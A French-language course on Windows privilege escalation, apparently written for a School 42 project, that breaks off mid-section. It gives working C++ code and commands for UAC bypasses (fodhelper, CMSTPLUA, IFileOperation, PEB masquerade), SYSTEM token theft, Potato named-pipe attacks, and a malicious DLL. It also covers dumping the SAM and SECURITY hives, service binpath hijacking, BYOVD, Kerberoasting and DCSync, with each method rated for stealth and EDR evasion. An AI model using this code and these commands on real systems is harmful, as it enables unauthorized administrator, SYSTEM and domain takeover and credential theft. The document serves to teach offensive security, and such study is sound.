# 🛡️ Windows Privilege Escalation — Cours Complet

> **Objectif :** Document éducatif pour le projet PrivEscLib-Win64 (École 42). Chaque méthode est présentée comme une fiche technique autonome : théorie, mécanisme interne détaillé, code C++ indicatif, évaluation offensive/défensive.

> **⚠️ Disclaimer :** Usage strictement éducatif et recherche autorisée uniquement. Ne jamais utiliser sur des systèmes sans permission explicite.

---

## 📋 Table des matières

| Partie | Contenu |
|--------|---------|
| **1** | [UAC Bypass](#partie-1--uac-bypass) |
| **2** | [Élévation locale vers SYSTEM](#partie-2--élévation-locale-vers-system) |
| **3** | [Manipulation de tokens](#partie-3--manipulation-de-tokens) |
| **4** | [Abus de privilèges Windows](#partie-4--abus-de-privilèges-windows) |
| **5** | [DLL Hijacking & Sideloading](#partie-5--dll-hijacking--sideloading) |
| **6** | [Exploitation kernel (LPE)](#partie-6--exploitation-kernel-lpe) |
| **7** | [Active Directory — Escalade domaine](#partie-7--active-directory--escalade-domaine) |
| **8** | [Post-exploitation & credentials](#partie-8--post-exploitation--credentials) |
| **9** | [Détection & Défense (Blue Team)](#partie-9--détection--défense-blue-team) |

---

## 📊 Légende des évaluations

| Symbole | Signification |
|---------|---------------|
| ★☆☆☆☆ → ★★★★★ | Furtivité (5 = très difficile à détecter) |
| 🟢 / 🟡 / 🔴 | Niveau AV/EDR : faible / moyen / élevé |
| 📦 | Artefact laissé sur la machine |
| 💻 | Compatibilité OS approximative |

---

---

# 🎯 Partie 1 : UAC Bypass

> **Théorie générale :** UAC (User Account Control) force les applications à demander explicitement une élévation avant d'exécuter des actions administratives. Quand un utilisateur membre du groupe Administrators lance un programme, Windows crée un **token restreint** (Medium Integrity) au lieu du token complet (High Integrity). Le bypass UAC exploite le fait que certains binaires système ont `autoElevate=true` dans leur manifest : ils montent en High Integrity **sans prompt** si l'appelant est déjà membre du groupe Administrators. Le principe général : détourner ce mécanisme pour exécuter notre code dans ce contexte élevé.

---

## ┌─────────────────────────────────────────────────────────┐
## │  Méthode 1 — RUNAS (baseline)                          │
## └─────────────────────────────────────────────────────────┘

### 📝 Théorie

Utilise `ShellExecuteA` avec le verbe `"runas"`. Déclenche le prompt UAC visible. C'est la méthode "honnête" — elle ne bypass rien, elle demande juste poliment l'élévation.

### 🔧 Comment ça marche, étape par étage

1. Le programme appelle `GetModuleFileNameA(NULL, path, MAX_PATH)` pour connaître son propre chemin sur disque
2. Il appelle `ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW)`
3. Windows intercepte le verbe `"runas"` et déclenche le Consent.exe (l'UI UAC)
4. Si l'utilisateur clique **Oui**, Windows relance le même binaire avec un token High Integrity
5. Le process original peut alors s'arrêter (`ExitProcess(0)`), c'est le nouveau process élevé qui prend le relais

### 💻 Code C++ indicatif

```cpp
bool elevate_runas()
{
    char path[MAX_PATH];
    HINSTANCE ret;

    GetModuleFileNameA(NULL, path, MAX_PATH);
    ret = ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
    return ((INT_PTR)ret > 32);
}
```

### 📊 Évaluation

| Critère | Note |
|---------|------|
| 🕶️ Furtivité | ★☆☆☆☆ |
| 📦 Artefact | Aucun fichier/registre — juste le prompt visible |
| 🛡️ AV/EDR | 🟢 Aucun (comportement applicatif normal) |
| 💻 Compatibilité | ~100% |

---

## ┌─────────────────────────────────────────────────────────┐
## │  Méthode 2 — FODHELPER (registre ms-settings)         │
## └─────────────────────────────────────────────────────────┘

### 📝 Théorie

`fodhelper.exe` ("Features on Demand Helper") est un binaire système avec `autoElevate=true`. Avant d'exécuter sa logique, il lit la clé de registre :

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

Cette clé n'existe normalement pas dans HKCU. Elle sert à redéfinir localement le handler du protocole `ms-settings:` (ouverture des paramètres Windows). Lors de la résolution du handler, Windows fusionne HKLM et HKCU, et **HKCU a priorité**. En créant cette clé dans HKCU, tu rediriges fodhelper vers ton binaire au lieu du vrai gestionnaire.

### 🔧 Comment ça marche, étape par étape

1. Tu récupères ton propre chemin via `GetModuleFileNameA`
2. Tu crées la clé registre ci-dessus dans HKCU
3. Dans cette clé, tu écris deux valeurs :
   - `DelegateExecute` = chaîne vide (sinon fodhelper essaie d'appeler le vrai delegate COM et échoue)
   - Valeur par défaut `(Default)` = chemin de ton payload
4. Tu lances `C:\Windows\System32\fodhelper.exe` avec `CreateProcessA`
5. fodhelper monte en High Integrity (autoElevate), lit la clé HKCU, exécute ton payload à la place du vrai handler
6. Ton payload tourne désormais en admin
7. Tu supprimes la clé registre (nettoyage)

### 💻 Code C++ indicatif

```cpp
bool elevate_fodhelper()
{
    char *path = get_myh_path();
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    create_key("Software\\Classes\\ms-settings\\Shell\\Open\\command");
    set_value("Software\\Classes\\ms-settings\\Shell\\Open\\command", "DelegateExecute", "");
    set_value("Software\\Classes\\ms-settings\\Shell\\Open\\command", NULL, path);

    CreateProcessA("C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, NULL,
                   FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    Sleep(500);
    delete_key_tree("Software\\Classes\\ms-settings\\Shell\\Open\\command");
    ExitProcess(0);
}
```

### 📊 Évaluation

| Critère | Note |
|---------|------|
| 🕶️ Furtivité | ★★☆☆☆ |
| 📦 Artefact | Clé registre (si non nettoyée) |
| 🛡️ AV/EDR | 🟡 Moyen — pattern très connu, surveillé par la plupart des EDR |
| 💻 Compatibilité | ~95% |

---

## ┌─────────────────────────────────────────────────────────┐
## │  Méthode 3 — COMPUTERDEFAULTS (registre ms-settings)   │
## └─────────────────────────────────────────────────────────┘

### 📝 Théorie

Identique à FODHELPER dans le principe, mais utilise `computerdefaults.exe` (panneau "Applications par défaut"), également `autoElevate=true`, et lit exactement la même clé registre `ms-settings`.

### 🤔 Pourquoi ça vaut la peine si c'est presque pareil ?

- **Binaire différent** → certaines règles EDR ciblent spécifiquement le nom `fodhelper.exe` mais pas `computerdefaults.exe`
- computerdefaults.exe est statistiquement moins surveillé dans les environnements enterprise
- Même mécanisme registre, surface d'attaque légèrement différente → bon exercice pour comprendre comment les EDR construisent leurs règles (par nom de binaire vs pattern comportemental)

### 🔧 Comment ça marche, étape par étape

1. Récupère le chemin de ton binaire courant
2. Crée `HKCU\Software\Classes\ms-settings\Shell\Open\command`
3. Écris `DelegateExecute` = "" et valeur par défaut = ton payload
4. Lance `C:\Windows\System32\computerdefaults.exe`
5. computerdefaults s'exécute élevé, lit HKCU, exécute ton payload
6. Supprime la clé

### 💻 Code C++ indicatif

```cpp
bool elevate_computerdefaults()
{
    char *path = get_myh_path();
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    if (!path)
        return false;
    create_key("Software\\Classes\\ms-settings\\Shell\\Open\\command");
    set_value("Software\\Classes\\ms-settings\\Shell\\Open\\command", "DelegateExecute", "");
    set_value("Software\\Classes\\ms-settings\\Shell\\Open\\command", NULL, path);
    CreateProcessA("C:\\Windows\\System32\\computerdefaults.exe",
                   NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    Sleep(500);
    delete_key_tree("Software\\Classes\\ms-settings\\Shell\\Open\\command");
    free(path);
    ExitProcess(0);
}
```

### 📊 Évaluation

| Critère | Note |
|---------|------|
| 🕶️ Furtivité | ★★☆☆☆ |
| 📦 Artefact | Clé registre |
| 🛡️ AV/EDR | 🟡 Faible-moyen |
| 💻 Compatibilité | ~95% |

---

## ┌─────────────────────────────────────────────────────────┐
## │  Méthode 4 — CMSTPLUA (COM ICMLuaUtil)                │
## └─────────────────────────────────────────────────────────┘

### 📝 Théorie

La DLL système `cmstplua.dll` expose un objet COM (`ICMLuaUtil`) marqué auto-élevé. Cet objet possède une méthode `ShellExec()` qui exécute du code dans le contexte du serveur COM, lui-même déjà élevé (High Integrity).

**Point clé :** la frontière de privilège est franchie **pendant l activation COM**, pas pendant ShellExec. Le processus hôte COM (`dllhost.exe`) tourne en High Integrity. Quand tu appelles `CoCreateInstance` avec ce CLSID, Windows lance dllhost.exe élevé et te donne une interface proxy. Toutes tes invocations suivantes sur cette interface s exécutent dans le contexte élevé.

### 🔧 Comment ça marche

1. `CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)` — initialise COM dans ton process Medium Integrity
2. `CoCreateInstance(CLSID_CMSTPLUA, NULL, CLSCTX_LOCAL_SERVER, IID_ICMLuaUtil, &util)`
3. Windows voit que cmstplua.dll est configuré comme serveur COM local auto-élevé
4. Il lance `dllhost.exe /Processid:{3E5FC7F9-...}` en High Integrity
5. Il crée l objet ICMLuaUtil dedans et retourne à ton process un pointeur d interface (proxy RPC)
6. Tu récupères la vtable de ICMLuaUtil : `void **vtable = *(void***)util;`
7. La méthode ShellExec est à un index précis de cette vtable (index ~10 selon version)
8. Tu appelles `shellExec(util, wpath, NULL, NULL, 0, SW_SHOW)`
9. L appel est marshalé vers dllhost.exe élevé qui exécute ShellExecute("runas", ton_payload) → ton binaire relancé High Integrity

### 💻 Code C++ indicatif

```cpp
const CLSID CLSID_CMSTPLUA =
    {0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
const IID IID_ICMLuaUtil =
    {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};

typedef HRESULT (__stdcall *ShellExec_t)(
    void *this_ptr, wchar_t *file, wchar_t *params,
    wchar_t *dir, ULONG flags, ULONG show);

bool elevate_cmstplua()
{
    void *util = NULL;
    wchar_t wpath[MAX_PATH];

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(CoCreateInstance(CLSID_CMSTPLUA, NULL,
                                CLSCTX_LOCAL_SERVER,
                                IID_ICMLuaUtil, &util)))
        return false;

    void **vtable = *(void***)util;
    ShellExec_t shellExec = (ShellExec_t)vtable[9];

    MultiByteToWideChar(CP_ACP, 0, get_myh_path(), -1, wpath, MAX_PATH);
    shellExec(util, wpath, NULL, NULL, 0, SW_SHOW);

    ((IUnknown*)util)->Release();
    CoUninitialize();
    return true;
}
```

### 💡 Bonus — CallCustomActionDll

ICMLuaUtil expose aussi `CallCustomActionDll(dll_path, func_name, ...)`, qui charge ta DLL via LoadLibraryExW et appelle ta fonction exportée **directement dans le contexte COM élevé**. Pas besoin de relancer un process : tu injectes du code natif dans dllhost.exe déjà élevé.

### 🧩 Autres objets COM exploitables (mêmes principes)

| CLSID | DLL | Statut |
|---|---|---|
| {3E5FC7F9-9A51-4367-9063-A120244FBEC7} | cmstplua.dll | Fonctionnel Win7→Win11 |
| {D2E7041B-2927-42fb-8E9F-7CE93B6DC937} | colorui.dll | Fonctionnel |
| {E9495B87-D950-4AB5-87A5-FF6D70BF3E90} | wscui.cpl | Fonctionnel |

### 📊 Évaluation

- Furtivité : ★★★★☆
- Artefact : aucun persistant
- AV/EDR : 🟢 Faible — simple CoCreateInstance légitime, pas d écriture registre/disque
- Compatibilité : ~90%

---

## ┌─────────────────────────────────────────────────────────┐
## │  Méthode 5 — SilentCleanup (tâche planifiée + env)   │
## └─────────────────────────────────────────────────────────┘

### 📝 Théorie

Windows planifie une tâche nommée `\Microsoft\Windows\DiskCleanup\SilentCleanup`. Cette tâche s exécute avec `RunLevel Highest` et lance :

```
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Le point faible : `%windir%` est une variable d environnement résolue **dans le contexte utilisateur**, pas système. Si tu modifies temporairement la variable `windir` de ta session pour pointer vers ton répertoire payload, la tâche va chercher cleanmgr.exe dans ton répertoire au lieu de System32.

### 🔧 Comment ça marche

1. Lis la valeur actuelle de `windir`
2. Remplace-la par le chemin contenant ton payload
3. Déclenche : schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"
4. Le Task Scheduler s exécute élevé, lit `%windir%` depuis ton contexte utilisateur
5. Il trouve ton payload → l exécute en High Integrity
6. Restaure `windir`

### 📊 Évaluation

| Critère | Note |
|---|---|
| Furtivité | ★★☆☆☆ |
| Artefact | Variable env temporaire |
| AV/EDR | 🟡 Faible-moyen |
| Compatibilité | ~85% |

---

## Méthode 6 — WSReset (registre AppX)

### Théorie

Similaire à FODHELPER mais avec wsreset.exe, également autoElevate=true. Il lit la clé :

```
HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\AnyCommand\Command
```

Clé très peu documentée, rarement créée, moins couverte par les signatures EDR génériques.

### Comment ça marche

1. Crée la clé AppX ci-dessus dans HKCU
2. Valeur par défaut = chemin de ton payload
3. Lance wsreset.exe
4. wsreset s exécute élevé, lit la clé, exécute ton payload
5. Nettoie

### Évaluation

- Furtivité : ★★★☆☆
- Artefact : clé registre
- AV/EDR : 🟢 Faible
- Compatibilité : ~80%

---

## Méthode 7 — EventVWR (patché, pédagogique)

eventvwr.exe était autoElevate et lisait HKCU\Software\Classes\mscfile\shell\open\command.

**Statut : patché depuis Windows 10 build 17134 (1803).**

Intérêt pédagogique : comprendre comment Microsoft corrige au cas par cas et pourquoi les patterns registre finissent par être fermés un à un.

---

## Méthode 8 — SLUI (registre exefile)

slui.exe est autoElevate et lit HKCU\Software\Classes\exefile\shell\open\command. Détourne le handler .exe générique.

Même principe que FODHELPER :
1. Crée la clé exefile ci-dessus
2. Valeur par défaut = payload
3. Lance slui.exe → il tente d ouvrir un .exe → utilise handler HKCU → exécute ton payload
4. Nettoie

Attention : modifier le handler .exe générique peut casser temporairement le lancement normal d applications sur le compte courant.

Furtivité ★★★☆☆ — Artefact clé registre — AV/EDR 🟢 Faible

## Méthode 9 — IFileOperation (COM + copie System32)

### Théorie

L objet COM `IFileOperation` ({3AD05575-8857-4850-9277-11B85BDB8E09}) permet de copier/déplacer/supprimer des fichiers avec élévation automatique quand invoqué depuis un contexte Medium Integrity. Il s exécute dans dllhost.exe.

Le flag clé est FOFX_REQUIREELEVATION : il indique au shell d utiliser le mécanisme UAC pour élever silencieusement l opération fichier si l appelant est membre du groupe Administrators. Résultat : tu peux écrire dans des répertoires protégés (System32) sans prompt visible.

### Comment ça marche

1. Initialise COM
2. Crée instance IFileOperation avec flags FOFX_REQUIREELEVATION + FOF_SILENT + FOF_NOCONFIRMATION
3. Copie ta DLL malveillante dans System32 ou le répertoire d un binaire autoElevate
4. Lance le binaire → il charge ta DLL → code exécuté en High Integrity

```cpp
void uac_ifileoperation_copy(const wchar_t *src, const wchar_t *dst_dir)
{
    IFileOperation *fileOp = NULL;
    IShellItem *from = NULL, *to = NULL;

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL,
                     IID_PPV_ARGS(&fileOp));
    fileOp->SetOperationFlags(
        FOF_NOCONFIRMATION | FOF_SILENT |
        FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS |
        FOFX_REQUIREELEVATION | FOF_NOERRORUI);
    SHCreateItemFromParsingName(src, NULL, IID_PPV_ARGS(&from));
    SHCreateItemFromParsingName(dst_dir, NULL, IID_PPV_ARGS(&to));
    fileOp->CopyItem(from, to, NULL, NULL);
    fileOp->PerformOperations();
    CoUninitialize();
}
```

Évaluation :
- Furtivité ★★★★☆
- Artefact : DLL dans System32 (à nettoyer)
- AV/EDR : 🟢 Faible — passe par dllhost.exe légitime
- Compatibilité ~90%

---

## Méthode 10 — Mock Trusted Directory (espace trailing)

### Théorie

UAC vérifie par comparaison de chaînes que le binaire autoElevate se trouve bien dans un répertoire de confiance (System32). Mais cette comparaison est littérale. En créant `C:\Windows \System32\` (notez l espace après Windows), la comparaison échoue silencieusement mais le chemin reste résoluble par le filesystem via le préfixe `\\?\`.

### Comment ça marche

1. Crée `\\?\C:\Windows \System32\`
2. Copie un binaire autoElevate cible dedans
3. Place ta DLL hijackable à côté
4. Lance le binaire → il s autoélève et charge ta DLL

Évaluation :
- Furtivité ★★★☆☆
- Artefact : répertoire factice
- AV/EDR : 🟡 Moyen

---

## Méthode 11 — PEB Masquerade + CMSTPLUA (avancé)

### Théorie détaillée

Certains checks de UAC comparent le processus parent. En manipulant le PEB (Process Environment Block), tu fais croire que ton process est explorer.exe et tu passes ces vérifications. Le PEB est une structure user-mode accessible via NtQueryInformationProcess(ProcessBasicInformation). Elle contient notamment :

- ImageBaseAddress
- ProcessParameters (pointeur vers RTL_USER_PROCESS_PARAMETERS)
- Dedans : CommandLine, ImagePathName (chaînes UNICODE_STRING)

En réécrivant ces champs pour qu ils ressemblent à ceux d explorer.exe, les fonctions de check UAC qui lisent ces infos sont trompées.

### Comment ça marche

1. Appelle NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, ...)
2. Récupère pbi.ProcessParameters (RTL_USER_PROCESS_PARAMETERS*)
3. Réécris CommandLine.Buffer et ImagePathName.Buffer avec "C:\Windows\explorer.exe"
4. Invoque ensuite CMSTPLUA comme décrit plus haut
5. Les checks basés sur le parent/image passent

Très valorisant portfolio : nécessite compréhension PEB, structures natives, et NtQueryInformationProcess.

Évaluation :
- Furtivité ★★★★★
- Artefact : aucun
- AV/EDR : 🟢 Très faible
- Compatibilité ~85%

# Partie 2 : Élévation locale vers SYSTEM

Ces techniques supposent un accès admin local déjà acquis (High Integrity). Objectif : Admin → NT AUTHORITY\SYSTEM.

## Méthode 12 — Token Theft depuis winlogon.exe

### Théorie

winlogon.exe tourne en tant que SYSTEM. En tant qu admin, tu peux activer SeDebugPrivilege puis ouvrir son token, le dupliquer, et créer un process SYSTEM avec.

### Comment ça marche

1. Active SeDebugPrivilege (voir Partie 3)
2. Trouve le PID de winlogon.exe via CreateToolhelp32Snapshot
3. OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION) — suffit même contre PPL
4. OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok)
5. DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDup)
6. CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE, cmd, ...)

```cpp
HANDLE steal_token(DWORD pid)
{
    HANDLE hProc, hTok = NULL, hDup = NULL;

    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok);
    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &hDup);
    CloseHandle(hProc); CloseHandle(hTok);
    return hDup;
}

bool spawn_as_system(HANDLE token, const wchar_t *cmdline)
{
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};

    si.cb = sizeof(si);
    return CreateProcessWithTokenW(token, LOGON_WITH_PROFILE,
                                   NULL, (LPWSTR)cmdline,
                                   0, NULL, NULL, &si, &pi);
}
```

Évaluation :
- Furtivité ★★★★☆
- Artefact : aucun disque/registre
- AV/EDR : 🟡 Faible-moyen — monitoring des handles LSASS/winlogon possible
- Compatibilité ~90%

---

## Méthode 13 — Named Pipe Impersonation (famille Potato)

### Théorie

Si ton process possède SeImpersonatePrivilege (typique des comptes de service : IIS AppPool, MSSQL, Network Service), tu crées un named pipe et forces un service SYSTEM à s y connecter. À la connexion, tu récupères son token et tu peux impersonifier son contexte.

### Comment ça marche

1. CreateNamedPipe("\\\\.\\pipe\\evil", PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE...)
2. Force un service SYSTEM à se connecter via :
   - Print Spooler RPC → PrintSpoofer
   - DCOM/RPCSS oxid → GodPotato
   - EFSRPC → EfsPotato
   - BITS COM → JuicyPotatoNG
3. ReadFile au moins un message
4. ImpersonateNamedPipeClient(hPipe)
5. OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, ...)
6. DuplicateTokenEx(TokenPrimary)
7. CreateProcessWithTokenW

```cpp
int named_pipe_privesc(void)
{
    HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\evil",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 0, 0, 0, NULL);

    ConnectNamedPipe(hPipe, NULL);

    char buf[4]; DWORD rb = 0;
    ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);
    ImpersonateNamedPipeClient(hPipe);

    HANDLE impTok, priTok;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok);
    DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &priTok);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
                            L"C:\\Windows\\System32\\cmd.exe",
                            NULL, 0, NULL, NULL, &si, &pi);
    RevertToSelf();
    return 0;
}
```

Variantes selon le trigger :

| Outil | Trigger | OS supporté |
|---|---|---|
| PrintSpoofer | Print Spooler RPC | Win10, Server 2016-2022 |
| GodPotato | DCOM/RPCSS oxid | Server 2012→2022, Win8→11 |
| JuicyPotatoNG | BITS COM | Win10/11 |
| EfsPotato | EFSRPC | Large |

Évaluation :
- Furtivité ★★★☆☆
- Artefact : pipe temporaire
- AV/EDR : 🟡 Moyen — patterns Potato connus
- Compatibilité ~85%

# Partie 3 : Manipulation de tokens

Chaque process Windows possède un **access token** contenant :
- SID utilisateur + groupes
- Liste de privileges (SeDebugPrivilege, etc.)
- Integrity Level (Low / Medium / High / System)
- Logon Session ID

Si un process élevé existe quelque part, son token peut être volé et réutilisé.

### Privilèges clés à chercher

| Privilège | Impact | Exploitation typique |
|---|---|---|
| SeDebugPrivilege | Accès mémoire tout process | Dump LSASS, injection, token theft |
| SeImpersonatePrivilege | Impersonifier clients | Potato attacks |
| SeAssignPrimaryTokenPrivilege | Assigner token à process | Similaire SeImpersonate |
| SeBackupPrivilege | Lire tout fichier | Dump SAM/SYSTEM/NTDS.dit |
| SeRestorePrivilege | Écrire partout | Overwrite fichiers système |
| SeTakeOwnershipPrivilege | Ownership objets | Modifier DACL puis accéder |
| SeLoadDriverPrivilege | Charger driver kernel | BYOVD |

### Activer un privilège (C++)

```cpp
bool enable_privilege(const char *priv_name)
{
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    OpenProcessToken(GetCurrentProcess(),
                     TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok);
    LookupPrivilegeValueA(NULL, priv_name, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(tok);
    return GetLastError() == ERROR_SUCCESS;
}
```

---

# Partie 4 : Abus de privileges Windows

## Méthode 14 — SeBackupPrivilege (Dump SAM/SYSTEM)

Avec SeBackupPrivilege tu lis n importe quel fichier, même si les ACL normales te bloquent.

1. Active SeBackupPrivilege
2. BackupRead ou RegSaveKey pour extraire les hives
3. Sur DC : extrais NTDS.dit (VSS ou dsdbutil)
4. Crack les hashes offline

```cmd
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SECURITY security.bak
secretsdump.py -sam sam.bak -system system.bak -security security.bak LOCAL
```

Furtivité ★★☆☆☆ — Artefact : hives exportés — AV/EDR 🔴 Élevé si naïf

---

## Méthode 15 — AlwaysInstallElevated

Si deux clés registre activées (HKLM + HKCU), tout user peut installer un MSI en SYSTEM.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi
```

Furtivité ★★☆☆☆ — Artefact : MSI installé — Rare en prod

---

## Méthode 16 — Unquoted Service Path

Chemin service avec espaces non quotés → Windows cherche segment par segment.

Exemple `C:\Program Files\Custom App\service.exe` :
1. `C:\Program.exe`
2. `C:\Program Files\Custom.exe`
3. `C:\Program Files\Custom App\service.exe`

```cmd
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\\windows" | findstr /iv "\""
```

Furtivité ★★☆☆☆ — Artefact : binaire déposé

---

## Méthode 17 — Weak Service Permissions

Droit SERVICE_CHANGE_CONFIG sur un service → redirige vers ton payload.

```cmd
accesschk.exe -uwcqv "Users" *
sc qc NomDuService
icacls "C:\chemin\service.exe"
sc config VulnerableService binpath= "C:\payload.exe"
sc start VulnerableService
```

Furtivité ★★☆☆☆ — Artefact : config modifiée — Fréquent en env mal configurée

---

## Méthode 18 — Scheduled Task Hijack

Tâche planifiée SYSTEM/Admin pointant vers script modifiable → remplace-le.

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest"}
schtasks /query /fo LIST /v
```

Furtivité ★★☆☆☆ — Artefact : fichier modifié

---

## Méthode 19 — Stored Credentials

Credentials en clair/faiblement chiffrés dans registre ou Credential Manager.

```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
dir /s /b C:\Unattend.xml C:\sysprep.inf 2>nul
findstr /si "password" *.txt *.ini *.config *.xml 2>nul
runas /savecred /user:DOMAIN\admin cmd.exe
```

Furtivité ★★★☆☆ — Artefact : aucun — AV/EDR 🟢 Aucun — Fréquent

# Partie 5 : DLL Hijacking & Sideloading

Ordre de recherche quand une DLL est chargée par nom :
1. Répertoire du binaire
2. System32
3. Répertoire Windows
4. Répertoire courant
5. Chaque répertoire du PATH

Si le binaire ne trouve pas sa DLL dans System32 (manquante ou LoadLibrary sans chemin complet), ta DLL est chargée à sa place.

## Méthode 20 — DLL Hijacking classique

1. Identifie un binaire autoElevate (computerdefaults.exe)
2. Analyse ses imports avec Process Monitor ou dumpbin /dependents
3. Trouve une DLL manquante ou chargée dynamiquement
4. Place ta DLL dans le répertoire cherché en premier
5. Lance le binaire → High Integrity

```cpp
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec("C:\\payload.exe", SW_HIDE);
    }
    return TRUE;
}
```

Évaluation : furtivité ★★★☆☆ — artefact DLL déposée — AV/EDR 🟡 Moyen (EDR surveillent DLL non signée dans process système)

---

## Méthode 21 — Dot-Local Hijacking

Créer un dossier `<nom_binaire>.exe.local` à côté du binaire cible. Windows priorise ce dossier dans la recherche.

Exemple : comctl32.dll malveillante dans `C:\Windows\System32\tcmsetup.exe.local\` puis lancer tcmsetup.exe.

Nécessite IFileOperation pour écrire dans System32 (Méthode 9).

Furtivité ★★★★☆ — Artefact dossier + DLL — AV/EDR 🟢 Faible

---

# Partie 6 : Exploitation kernel (LPE)

Les CVEs kernel donnent accès Ring-0 mais sont complexes. Nécessitent souvent CVE non patchée ou driver vulnérable, compréhension profonde du kernel, primitives mémoire (OOB write, UAF).

## Méthode 22 — BYOVD (Bring Your Own Vulnerable Driver)

Windows exige que les drivers soient signés. Certains drivers légitimement signés contiennent des vulnérabilités. Tu charges ce driver vulnérable et l utilises pour obtenir des primitives kernel.

1. Trouve un driver vulnérable signé (LOLDrivers)
2. Charge via SCM : sc create ... type= kernel binPath= driver.sys
3. Communique via DeviceIoControl (IOCTL)
4. Exploite la vulnérabilité (lecture/écriture mémoire arbitraire)
5. Modifie _TOKEN->Privileges → SeDebugPrivilege → SYSTEM

Drivers vulnérables connus :

| Driver | CVE | Primitive |
|---|---|---|
| Lenovo LnvMSRIO.sys | CVE-2025-8061 | Lecture/écriture MSR Ring-0 |
| MSI Afterburner | CVE-2019-16098 | Lecture/écriture physique |
| Dell dbutil | CVE-2021-21551 | Lecture/écriture mémoire |
| appid.sys (AppLocker) | CVE-2024-21338 | Untrusted pointer deref |

Furtivité ★★★★☆ — Artefact driver chargé — AV/EDR 🔴 Élevé — Complexité très élevée

## Méthode 23 — CVE kernel directe

Exemples récents :
- CVE-2024-35250 : Untrusted pointer deref driver kernel-mode
- CVE-2024-38186 : OOB write clipsp.sys
- CVE-2024-36336 : Integer overflow paged pool

Nécessitent heap grooming, bypass SMEP/kCFG, modification structures kernel (_TOKEN, _EPROCESS).

Furtivité ★★★★★ — Artefact aucun — AV/EDR 🟢 Quasi nul — Compatibilité version-specific — Extrême

---

# Partie 7 : Active Directory

## Méthode 24 — Kerberoasting

Tout utilisateur authentifié peut demander un TGS pour tout compte avec SPN. Le TGS est chiffré avec le hash du mot de passe du compte de service → crackable offline si faible.

1. setspn -Q */*
2. GetUserSPNs.py domain/user:pass -request
3. hashcat -m 13100 tgs.txt wordlist.txt

Furtivité ★★★☆☆ — Artefact TGS logué DC — AV/EDR 🟡 Détection par volume anormal

## Méthode 25 — AS-REP Roasting

Comptes sans pré-authentification Kerberos peuvent avoir leur AS-REP demandé par n importe qui. Partie chiffrée avec le hash du mdp → crackable offline.

Différence avec Kerberoasting : Kerberoasting cible comptes de service (SPN), AS-REP cible comptes sans pre-auth. AS-REP fonctionne même sans credential valide si tu connais le username.

Furtivité ★★★☆☆ — AV/EDR 🟢 Faible

## Méthode 26 — DCSync

Avec Replicating Directory Changes + Replicating Directory Changes All sur le domaine, simule un DC et demande la réplication de tous les hashes.

```bash
secretsdump.py 'domain.com/user:password@DC.domain.com'
```

Furtivité ★★☆☆☆ — AV/EDR 🔴 Élevé côté DC (event 4662)

## Méthode 27 — Unconstrained Delegation abuse

Un ordinateur avec unconstrained delegation reçoit le TGT de tout utilisateur s y authentifiant. Si tu compromets ce serveur, réutilise ces TGT.

